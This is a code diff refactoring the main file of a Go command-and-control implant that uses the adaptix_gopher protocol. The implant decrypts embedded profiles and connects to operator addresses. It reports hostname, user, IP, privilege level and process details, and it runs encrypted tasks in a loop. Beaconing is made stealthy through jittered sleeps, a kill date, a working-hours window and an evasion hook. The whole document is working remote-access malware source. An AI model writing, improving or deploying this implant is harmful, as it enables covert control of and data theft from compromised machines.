@@ -1,12 +1,12 @@
 package main
 
 import (
-	cryptorand "crypto/rand"
+	crand "crypto/rand"
 	"encoding/binary"
-	"io"
 	"math/rand"
 	"net"
 	"os"
+	"path/filepath"
 	"runtime"
 	"sync"
 	"time"
@@ -21,6 +21,7 @@ import (
 
 var (
 	agent impl.AgentImpl
+	jobs  = impl.NewJobsController()
 
 	stateMu     sync.RWMutex
 	agentSleep  int   // seconds
@@ -53,26 +54,18 @@ func main() {
 
 	// __EVASION_INIT__
 
-	// Try each embedded profile in order until one succeeds.
+	// Iterate profiles: decrypt, parse, connect.
 	for _, blob := range encProfiles {
-		if len(blob) < crypto.KeySize {
+		if len(blob) == 0 {
 			continue
 		}
-		key := blob[:crypto.KeySize]
-		encData := blob[crypto.KeySize:]
-
-		plaintext, err := crypto.DecryptData(encData, key)
+		profile, sessionKey, err := parseEmbeddedProfile(blob)
 		if err != nil {
 			continue
 		}
-
-		var profile protocol.Profile
-		if err = protocol.Unmarshal(plaintext, &profile); err != nil {
-			continue
-		}
-
+		crypto.SKey = sessionKey
 		initProfileState(&profile)
-		run(&profile, key)
+		run(&profile, sessionKey)
 	}
 }
 
@@ -94,89 +87,46 @@ func initProfileState(p *protocol.Profile) {
 
 func run(profile *protocol.Profile, listenerKey []byte) {
 	connCount := 0
-	maxConn := profile.ConnCount
-
 	for {
 		if shouldExit() {
 			os.Exit(0)
 		}
-
 		waitForWorkingHours()
+		if len(profile.Addresses) == 0 {
+			return
+		}
 
 		addr := profile.Addresses[connCount%len(profile.Addresses)]
 		connCount++
 
-		// Transport: user-defined Dial (default: TCP + optional TLS).
 		conn, err := agent.Dial(addr, profile)
 		if err != nil {
 			sleepWithJitter()
-			if maxConn > 0 && connCount >= maxConn {
-				os.Exit(0)
-			}
 			continue
 		}
 
-		connCount = 0
-
-		// Generate random session key for this connection.
-		sessionKey := make([]byte, crypto.KeySize)
-		if _, err = io.ReadFull(cryptorand.Reader, sessionKey); err != nil {
-			conn.Close()
-			sleepWithJitter()
-			continue
-		}
-
-		// Build SessionInfo with session key.
-		si := createInfo(profile)
-		si.EncryptKey = sessionKey
-		siData, err := protocol.Marshal(si)
+		initMsg, err := buildInitMessage(profile, listenerKey)
 		if err != nil {
-			conn.Close()
+			_ = conn.Close()
 			sleepWithJitter()
 			continue
 		}
 
-		// Random agent ID for this init pack.
-		var ridBuf [4]byte
-		_, _ = io.ReadFull(cryptorand.Reader, ridBuf[:])
-		agentId := binary.BigEndian.Uint32(ridBuf[:])
-
-		// Wrap in InitPack → StartMsg (adaptix_gopher wire protocol).
-		ipData, err := protocol.Marshal(protocol.InitPack{
-			Id:   uint(agentId),
-			Type: uint(profile.Type),
-			Data: siData,
-		})
+		enc, err := crypto.EncryptData(initMsg, listenerKey)
 		if err != nil {
-			conn.Close()
-			sleepWithJitter()
-			continue
-		}
-		smData, err := protocol.Marshal(protocol.StartMsg{
-			Type: protocol.INIT_PACK,
-			Data: ipData,
-		})
-		if err != nil {
-			conn.Close()
+			_ = conn.Close()
 			sleepWithJitter()
 			continue
 		}
 
-		// Encrypt with listener key and send.
-		enc, err := crypto.EncryptData(smData, listenerKey)
-		if err != nil {
-			conn.Close()
-			sleepWithJitter()
-			continue
-		}
-		if err = protocol.SendMsg(conn, enc); err != nil {
-			conn.Close()
+		if err := protocol.SendMsg(conn, enc); err != nil {
+			_ = conn.Close()
 			sleepWithJitter()
 			continue
 		}
 
-		taskLoop(conn, sessionKey)
-		conn.Close()
+		taskLoop(conn, listenerKey)
+		_ = conn.Close()
 		sleepWithJitter()
 	}
 }
@@ -198,28 +148,52 @@ func taskLoop(conn net.Conn, sessionKey []byte) {
 			return
 		}
 
-		var inMsg protocol.Message
-		if err = protocol.Unmarshal(plaintext, &inMsg); err != nil {
+		var in protocol.Message
+		if err := protocol.Unmarshal(plaintext, &in); err != nil {
 			return
 		}
-
-		responses := TaskProcess(inMsg.Object)
-		if responses == nil {
+		if in.Type != 1 {
+			sleepWithJitter()
 			continue
 		}
 
-		respMsg := protocol.Message{Type: 1, Object: responses}
-		packed, err := protocol.Marshal(respMsg)
+		responses := TaskProcess(in.Object)
+		if len(responses) > 0 {
+			outMsg, err := protocol.Marshal(protocol.Message{Type: 1, Object: responses})
+			if err != nil {
+				return
+			}
+
+			enc, err := crypto.EncryptData(outMsg, sessionKey)
+			if err != nil {
+				return
+			}
+
+			if err := protocol.SendMsg(conn, enc); err != nil {
+				return
+			}
+
+			sleepWithJitter()
+			continue
+		}
+
+		jobResponses := drainAsyncJobObjects()
+		if len(jobResponses) == 0 {
+			sleepWithJitter()
+			continue
+		}
+
+		outMsg, err := protocol.Marshal(protocol.Message{Type: 2, Object: jobResponses})
 		if err != nil {
 			return
 		}
 
-		enc, err := crypto.EncryptData(packed, sessionKey)
+		enc, err := crypto.EncryptData(outMsg, sessionKey)
 		if err != nil {
 			return
 		}
 
-		if err = protocol.SendMsg(conn, enc); err != nil {
+		if err := protocol.SendMsg(conn, enc); err != nil {
 			return
 		}
 
@@ -229,43 +203,93 @@ func taskLoop(conn net.Conn, sessionKey []byte) {
 
 // ─── Registration ──────────────────────────────────────────────────────────────
 
-func createInfo(p *protocol.Profile) protocol.SessionInfo {
+func createInfo(sessionKey []byte) protocol.SessionInfo {
 	hostname, _ := os.Hostname()
-
-	internalIP := ""
-	if ifaces, err := net.Interfaces(); err == nil {
-		for _, iface := range ifaces {
-			if iface.Flags&net.FlagLoopback != 0 {
-				continue
-			}
-			if addrs, err := iface.Addrs(); err == nil {
-				for _, a := range addrs {
-					if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
-						internalIP = ipNet.IP.String()
-						goto doneIP
-					}
-				}
-			}
-		}
-	}
-doneIP:
-
 	username := os.Getenv("USER")
 	if username == "" {
 		username = os.Getenv("USERNAME")
 	}
+	cp := agent.GetCP()
 
 	return protocol.SessionInfo{
-		Host:      hostname,
-		User:      username,
-		Ipaddr:    internalIP,
-		Os:        runtime.GOOS,
-		OSVersion: agent.GetOsVersion(),
-		Elevated:  agent.IsElevated(),
-		PID:       os.Getpid(),
-		Process:   processName(),
-		Acp:       agent.GetCP(),
+		Process:    processName(),
+		PID:        os.Getpid(),
+		User:       username,
+		Host:       hostname,
+		Ipaddr:     localIPv4(),
+		Elevated:   agent.IsElevated(),
+		Acp:        cp,
+		Oem:        cp,
+		Os:         runtime.GOOS,
+		OSVersion:  agent.GetOsVersion(),
+		EncryptKey: sessionKey,
 	}
+}
+
+func parseEmbeddedProfile(blob []byte) (protocol.Profile, []byte, error) {
+	if len(blob) <= crypto.KeySize {
+		return protocol.Profile{}, nil, os.ErrInvalid
+	}
+	key := append([]byte(nil), blob[:crypto.KeySize]...)
+	plain, err := crypto.DecryptData(blob[crypto.KeySize:], key)
+	if err != nil {
+		return protocol.Profile{}, nil, err
+	}
+	var profile protocol.Profile
+	if err := protocol.Unmarshal(plain, &profile); err != nil {
+		return protocol.Profile{}, nil, err
+	}
+	return profile, key, nil
+}
+
+func buildInitMessage(profile *protocol.Profile, sessionKey []byte) ([]byte, error) {
+	beat, err := protocol.Marshal(createInfo(sessionKey))
+	if err != nil {
+		return nil, err
+	}
+	initPackData, err := protocol.Marshal(protocol.InitPack{
+		Id:   uint(randomUint32()),
+		Type: profile.Type,
+		Data: beat,
+	})
+	if err != nil {
+		return nil, err
+	}
+	return protocol.Marshal(protocol.StartMsg{Type: protocol.INIT_PACK, Data: initPackData})
+}
+
+func randomUint32() uint32 {
+	var buf [4]byte
+	if _, err := crand.Read(buf[:]); err != nil {
+		return uint32(rand.Int31())
+	}
+	return binary.BigEndian.Uint32(buf[:])
+}
+
+func localIPv4() string {
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		return ""
+	}
+	for _, iface := range ifaces {
+		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
+			continue
+		}
+		addrs, err := iface.Addrs()
+		if err != nil {
+			continue
+		}
+		for _, addr := range addrs {
+			ipNet, ok := addr.(*net.IPNet)
+			if !ok || ipNet.IP == nil {
+				continue
+			}
+			if v4 := ipNet.IP.To4(); v4 != nil {
+				return v4.String()
+			}
+		}
+	}
+	return ""
 }
 
 func processName() string {
@@ -273,44 +297,36 @@ func processName() string {
 	if err != nil {
 		return "__NAME__"
 	}
-	for i := len(exe) - 1; i >= 0; i-- {
-		if exe[i] == '/' || exe[i] == '\\' {
-			return exe[i+1:]
-		}
-	}
-	return exe
+	return filepath.Base(exe)
 }
 
 // ─── Stealth helpers ───────────────────────────────────────────────────────────
 
 func sleepWithJitter() {
 	stateMu.RLock()
-	s := agentSleep
-	j := agentJitter
+	base := agentSleep
+	jit := agentJitter
 	stateMu.RUnlock()
 
-	if s <= 0 {
-		s = 60
+	if base <= 0 {
+		return
 	}
-	sleepMs := s * 1000
-	if j > 0 {
-		delta := int(float64(sleepMs) * float64(j) / 100.0)
-		sleepMs += int(rand.Int63n(int64(delta*2+1))) - delta
-		if sleepMs < 500 {
-			sleepMs = 500
+	ms := base * 1000
+	if jit > 0 && jit <= 90 {
+		delta := ms * jit / 100
+		ms += rand.Intn(2*delta+1) - delta
+		if ms < 0 {
+			ms = 100
 		}
 	}
-	time.Sleep(time.Duration(sleepMs) * time.Millisecond)
+	time.Sleep(time.Duration(ms) * time.Millisecond)
 }
 
 func shouldExit() bool {
 	stateMu.RLock()
 	kd := killDate
 	stateMu.RUnlock()
-	if kd == 0 {
-		return false
-	}
-	return time.Now().Unix() >= kd
+	return kd > 0 && time.Now().Unix() > kd
 }
 
 func waitForWorkingHours() {
@@ -321,22 +337,22 @@ func waitForWorkingHours() {
 		stateMu.RUnlock()
 
 		if ws == 0 && we == 0 {
-			return
+			return // no restriction
 		}
 
 		now := time.Now()
 		hhmm := now.Hour()*100 + now.Minute()
-
 		if ws <= we {
+			// Normal window: e.g., 0900–1700
 			if hhmm >= ws && hhmm < we {
 				return
 			}
 		} else {
+			// Overnight window: e.g., 2200–0600
 			if hhmm >= ws || hhmm < we {
 				return
 			}
 		}
-
 		time.Sleep(60 * time.Second)
 	}
 }
